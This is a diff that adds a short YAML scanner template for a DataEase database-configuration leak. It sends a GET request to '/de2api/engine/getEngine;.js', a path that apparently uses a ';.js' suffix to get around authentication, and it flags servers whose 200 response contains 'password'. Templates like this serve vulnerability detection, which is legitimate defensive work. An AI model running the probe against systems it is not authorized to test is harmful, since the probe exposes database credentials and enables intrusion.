@@ -1,0 +1,21 @@
+id:
+info:
+  name: DataEase存在数据库配置信息泄露
+  severity: 4
+  description:
+  details:
+  repair:
+requests1:
+  method: GET
+  path: /de2api/engine/getEngine;.js
+  headers:
+    User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
+    Accept-Encoding: gzip, deflate
+    Accept: '*/*'
+    Connection: close
+response1:
+  headers:
+  body: password
+  code: 200
+requests2:
+response2:
